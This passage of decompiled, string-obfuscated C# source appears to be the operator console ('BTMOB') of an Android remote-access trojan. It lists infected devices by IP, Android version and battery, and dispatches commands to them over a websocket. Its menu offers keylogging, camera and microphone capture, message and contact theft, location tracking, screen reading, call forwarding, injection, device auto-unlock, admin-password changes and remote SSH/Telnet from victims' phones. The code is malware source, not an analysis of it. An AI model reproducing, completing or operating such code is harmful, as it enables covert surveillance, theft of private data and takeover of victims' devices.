			barview.CoreWebView2.ExecuteScriptAsync(javaScript2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		UpdateActiveClientPanel();
	}

	private void RemoteSSHToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		remotetool remotetool2 = new remotetool();
		remotetool2.mytitle.Text = BTConst.remotesshstr;
		if (remotetool2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string value = remotetool2.protocombos.Text;
		string value2 = remotetool2.Htext.Text;
		string value3 = remotetool2.Utext.Text;
		string value4 = remotetool2.passtext.Text;
		string value5 = remotetool2.porttext.Text;
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._2D19111F, EXGuarder._6B0B5B74);
						dictionary.Add(EXGuarder._196C2B2C, value);
						dictionary.Add(EXGuarder._514F0A3C, value2);
						dictionary.Add(EXGuarder._784B3424, value3);
						dictionary.Add(EXGuarder._3E384571, value4);
						dictionary.Add(EXGuarder._40326368, value5);
						dictionary.Add(EXGuarder._3421355C, EXGuarder._022C1675);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RemoteTelnetToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		remotetool remotetool2 = new remotetool();
		remotetool2.mytitle.Text = BTConst.remotetelnetstr;
		if (remotetool2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string value = remotetool2.protocombos.Text;
		string value2 = remotetool2.Htext.Text;
		string value3 = remotetool2.Utext.Text;
		string value4 = remotetool2.passtext.Text;
		string value5 = remotetool2.porttext.Text;
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._29286918, EXGuarder._7139401E);
						dictionary.Add(EXGuarder._654F482A, value);
						dictionary.Add(EXGuarder._3E625654, value2);
						dictionary.Add(EXGuarder._04597943, value3);
						dictionary.Add(EXGuarder._02406D4A, value4);
						dictionary.Add(EXGuarder._2F24672E, value5);
						dictionary.Add(EXGuarder._4B3C4413, EXGuarder._6678271E);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStrip_blocker_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					string name = EXGuarder._10320528 + bTClient.mobid;
					Blocker blocker = (Blocker)MyProject.Application.OpenForms[name];
					if (blocker == null)
					{
						blocker = new Blocker();
						blocker.Name = name;
						blocker.Btcli = bTClient;
						blocker.Show();
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._1C305625, BTConst.blkercom);
						dictionary.Add(EXGuarder._6B73043A, EXGuarder._2B081541);
						dictionary.Add(EXGuarder._2D051A75, EXGuarder._51321D51);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						blocker.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem2_Click_1(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					string name = EXGuarder._75424032 + bTClient.mobid;
					autounlock autounlock2 = (autounlock)MyProject.Application.OpenForms[name];
					if (autounlock2 == null)
					{
						autounlock2 = new autounlock(bTClient);
						autounlock2.Name = name;
						autounlock2.Show();
						autounlock2.TopMost = true;
						autounlock2.TopMost = false;
					}
					else
					{
						autounlock2.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem3_Click_1(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _5F655A = EXGuarder._5F655A77;
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = BTConst.adminpassstr;
		myinputs2.inputtext.Text = EXGuarder._5F655A77;
		myinputs2.inputtext.Watermark = BTConst.nopassstr;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_5F655A = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_5F655A))
		{
			_5F655A = EXGuarder._02175D78;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._45262B36, BTConst.admncom);
					dictionary.Add(EXGuarder._27675440, EXGuarder._4471043E);
					dictionary.Add(EXGuarder._672E730B, _5F655A);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex < 0 || e.ColumnIndex < 0 || e.RowIndex >= DGV0.Rows.Count)
		{
			return;
		}
		DataGridViewRow dataGridViewRow = DGV0.Rows[e.RowIndex];
		if (dataGridViewRow.Cells[0].Tag == null || !(dataGridViewRow.Cells[0].Tag is BTClient client))
		{
			return;
		}
		string name = DGV0.Columns[e.ColumnIndex].Name;
		if (Operators.CompareString(name, EXGuarder._0E32386E, TextCompare: false) != 0)
		{
			if (Operators.CompareString(name, EXGuarder._0261511A, TextCompare: false) == 0)
			{
				ToggleFavorite(dataGridViewRow, client, e.RowIndex);
			}
		}
		else
		{
			ToggleEncryption(dataGridViewRow, client);
		}
	}

	private void ToggleEncryption(DataGridViewRow row, BTClient client)
	{
		DataGridViewImageCell dataGridViewImageCell = (DataGridViewImageCell)row.Cells[EXGuarder._305C2323];
		client.EncryptState = !client.EncryptState;
		if (client.EncryptState)
		{
			dataGridViewImageCell.Value = Resources.SecureON;
			client.UpdateOption(EXGuarder._0B3A714A, EXGuarder._42121850);
		}
		else
		{
			dataGridViewImageCell.Value = Resources.roket;
			client.UpdateOption(EXGuarder._0B3A714A, EXGuarder._39424142);
		}
		client.sendoptions();
	}

	private void ToggleFavorite(DataGridViewRow row, BTClient client, int rowIndex)
	{
		client.isFavorite = !client.isFavorite;
		BTRegistry.AddFavorite(client.mobid, client.isFavorite);
		DataGridViewImageCell dataGridViewImageCell = (DataGridViewImageCell)row.Cells[EXGuarder._72387520];
		dataGridViewImageCell.Value = (client.isFavorite ? Resources.fav_star : Resources.fav_star_off);
		row.Cells[3].Tag = client.isFavorite;
		BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (rowIndex >= 0 && rowIndex < DGV0.Rows.Count)
			{
				if (client.isFavorite)
				{
					MoveRowToTop(rowIndex);
				}
				else
				{
					MoveRowOutOfFavorites(rowIndex);
				}
			}
		}));
	}

	private void MoveRowToTop(int rowIndex)
	{
		DataGridView dGV = DGV0;
		if (rowIndex > 0 && rowIndex < dGV.Rows.Count)
		{
			int num = -1;
			if (dGV.Rows.Count > 0)
			{
				num = dGV.FirstDisplayedScrollingRowIndex;
			}
			dGV.SuspendLayout();
			dGV.ClearSelection();
			DataGridViewRow dataGridViewRow = dGV.Rows[rowIndex];
			dGV.Rows.RemoveAt(rowIndex);
			dGV.Rows.Insert(0, dataGridViewRow);
			if (num >= 0 && num < dGV.Rows.Count)
			{
				dGV.FirstDisplayedScrollingRowIndex = num;
			}
			dGV.ResumeLayout();
		}
	}

	private void MoveRowOutOfFavorites(int rowIndex)
	{
		DataGridView dGV = DGV0;
		if (rowIndex >= 0 && rowIndex < dGV.Rows.Count)
		{
			dGV.SuspendLayout();
			dGV.ClearSelection();
			DataGridViewRow dataGridViewRow = dGV.Rows[rowIndex];
			dGV.Rows.RemoveAt(rowIndex);
			dGV.Rows.Insert(dGV.Rows.Count, dataGridViewRow);
			dGV.ResumeLayout();
		}
	}

	public void StartDisconnectDetector()
	{
		if (Interlocked.Exchange(ref _disconnectDetectorRunning, 1) != 1)
		{
			Task.Run([SpecialName] () =>
			{
				DisconnectDetectorLoop();
			});
		}
	}

	private void DisconnectDetectorLoop()
	{
		while (Alive)
		{
			try
			{
				Thread.Sleep(5000);
				List<BTClient> list = BTEngine.clients.Values.ToList();
				DateTime utcNow = DateTime.UtcNow;
				foreach (BTClient item in list)
				{
					if (item != null && item.isConnected && (utcNow - item.LastPingUtc).TotalSeconds >= 120.0)
					{
						item.isConnected = false;
						if (item.row != null)
						{
							RemoveClient(new object[1] { item });
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Debuger.Log_e(EXGuarder._6A2B5F41, codes.EXtoString(ex2));
				ProjectData.ClearProjectError();
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.Form1));
		this.btnExit = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.stateview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.navview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.statestimer = new System.Windows.Forms.Timer(this.components);
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.walpclu = new System.Windows.Forms.DataGridViewImageColumn();
		this.flgcliclu = new System.Windows.Forms.DataGridViewImageColumn();
		this.scrcliclu = new System.Windows.Forms.DataGridViewImageColumn();
		this.clintnameclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ipclinclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.andoverclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.trakingclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.instdatclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.verclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.conicoclu = new System.Windows.Forms.DataGridViewImageColumn();
		this.btryclu = new System.Windows.Forms.DataGridViewImageColumn();
		this.actvclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.jctcolmn = new System.Windows.Forms.DataGridViewImageColumn();
		this.pngtxtclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.favclmn = new System.Windows.Forms.DataGridViewImageColumn();
		this.cryptclmon = new System.Windows.Forms.DataGridViewImageColumn();
		this.ctx_clients = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ToolStrip_manage = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_files = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_scr = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_cam = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_mic = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_msgs = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_contct = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_apps = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_keylog = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_location = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_brows = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_tools = new System.Windows.Forms.ToolStripMenuItem();
		this.ToastToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenLinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CallPhoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.VibrateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TerminalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CallForwardingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteSSHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.autounlktoolstrip = new System.Windows.Forms.ToolStripMenuItem();
		this.admintoolstrip = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoteTelnetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_trak = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_chat = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_clipb = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_blocker = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_lockscr = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_scrred = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_ject = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_edits = new System.Windows.Forms.ToolStripMenuItem();
		this.NotesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RenameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RedirectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStrip_conct = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
		this.BlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStrip_clifolder = new System.Windows.Forms.ToolStripMenuItem();
		this.DashboardPanel = new System.Windows.Forms.Panel();
		this.panel_DGV0 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W16 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIScrollBar1 = new DrakeUI.Framework.DrakeUIScrollBar();
		this.barview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.ClitopView = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.homepanel = new System.Windows.Forms.Panel();
		this.homeview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel_updates = new System.Windows.Forms.Panel();
		this.mywebview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.updateview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.panel_list_block = new System.Windows.Forms.Panel();
		this.blockview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.panel_CONLIST = new System.Windows.Forms.Panel();
		this.ConView = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.panel_notifys = new System.Windows.Forms.Panel();
		this.NotifyVew = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel_screens = new System.Windows.Forms.Panel();
		this.FlowLayoutPanel1 = new System.Windows.Forms.FlowLayoutPanel();
		this.ctx_cons = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ClearAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ctxnotify = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ToolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W6 = new DrakeUI.Framework.DrakeWidth_W();
		this.BTtiptool = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.hidbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.minimizbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.contimer = new System.Windows.Forms.Timer(this.components);
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.FadeInTimer = new System.Windows.Forms.Timer(this.components);
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.stateview).BeginInit();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.navview).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctx_clients.SuspendLayout();
		this.DashboardPanel.SuspendLayout();
		this.panel_DGV0.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.barview).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.ClitopView).BeginInit();
		this.homepanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.homeview).BeginInit();
		this.Panel_updates.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.mywebview).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.updateview).BeginInit();
		this.panel_list_block.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.blockview).BeginInit();
		this.panel_CONLIST.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ConView).BeginInit();
		this.panel_notifys.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.NotifyVew).BeginInit();
		this.Panel_screens.SuspendLayout();
		this.ctx_cons.SuspendLayout();
		this.ctxnotify.SuspendLayout();
		this.Panel1.SuspendLayout();
		this.Panel9.SuspendLayout();
		base.SuspendLayout();
		this.btnExit.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.Cursor = System.Windows.Forms.Cursors.Hand;
		this.btnExit.Dock = System.Windows.Forms.DockStyle.Right;
		this.btnExit.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 16f, System.Drawing.FontStyle.Bold);
		this.btnExit.ForeColor = System.Drawing.Color.FromArgb(109, 109, 103);
		this.btnExit.ForeHoverColor = System.Drawing.Color.Red;
		this.btnExit.Location = new System.Drawing.Point(1411, 4);
		this.btnExit.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnExit.Name = EXGuarder._22446670;
		this.btnExit.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.btnExit.RectColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.btnExit.RectDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.btnExit.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.btnExit.Size = new System.Drawing.Size(35, 12);
		this.btnExit.Style = DrakeUI.Framework.UIStyle.Custom;
		this.btnExit.Symbol = 61713;
		this.btnExit.SymbolSize = 0;
		this.btnExit.TabIndex = 2;
		this.btnExit.Text = EXGuarder._60710645;
		this.BTtiptool.SetToolTip(this.btnExit, EXGuarder._07584852);
		this.Panel2.Controls.Add(this.stateview);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 8.5f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Panel2.Location = new System.Drawing.Point(3, 831);
		this.Panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel2.Name = EXGuarder._3F593524;
		this.Panel2.Size = new System.Drawing.Size(1550, 50);
		this.Panel2.TabIndex = 2;
		this.stateview.AllowExternalDrop = true;
		this.stateview.CreationProperties = null;
		this.stateview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stateview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.stateview.Location = new System.Drawing.Point(0, 0);
		this.stateview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.stateview.Name = EXGuarder._2114176D;
		this.stateview.Size = new System.Drawing.Size(1550, 50);
		this.stateview.TabIndex = 45;
		this.stateview.ZoomFactor = 1.0;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.navview);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel3.Location = new System.Drawing.Point(3, 3);
		this.Panel3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel3.Name = EXGuarder._29567843;
		this.Panel3.Padding = new System.Windows.Forms.Padding(5);
		this.Panel3.Size = new System.Drawing.Size(100, 828);
		this.Panel3.TabIndex = 3;
		this.navview.AllowExternalDrop = true;
		this.navview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.navview.CreationProperties = null;
		this.navview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.navview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.navview.ForeColor = System.Drawing.Color.White;
		this.navview.Location = new System.Drawing.Point(5, 5);
		this.navview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.navview.Name = EXGuarder._63285A28;
		this.navview.Size = new System.Drawing.Size(90, 818);
		this.navview.TabIndex = 44;
		this.navview.ZoomFactor = 1.0;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W2.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(3, 881);
		this.DrakeWidth_W2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W2.Name = EXGuarder._555B2271;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(1550, 3);
		this.DrakeWidth_W2.TabIndex = 4;
		this.statestimer.Interval = 5000;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 10f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Padding = new System.Windows.Forms.Padding(3);
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(60, 60, 60);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CausesValidation = false;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 10f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Padding = new System.Windows.Forms.Padding(3);
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(60, 60, 60);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeight = 29;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV0.ColumnHeadersVisible = false;
		this.DGV0.Columns.AddRange(this.walpclu, this.flgcliclu, this.scrcliclu, this.clintnameclu, this.ipclinclu, this.andoverclu, this.trakingclu, this.instdatclu, this.verclu, this.conicoclu, this.btryclu, this.actvclu, this.jctcolmn, this.pngtxtclu, this.favclmn, this.cryptclmon);
		this.DGV0.ContextMenuStrip = this.ctx_clients;
		this.DGV0.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 10f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(60, 60, 60);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.Location = new System.Drawing.Point(0, 84);
		this.DGV0.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DGV0.Name = EXGuarder._544B0011;
		this.DGV0.ReadOnly = true;
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 10f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.Padding = new System.Windows.Forms.Padding(3);
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(60, 60, 60);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.RowHeadersWidth = 51;
		this.DGV0.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
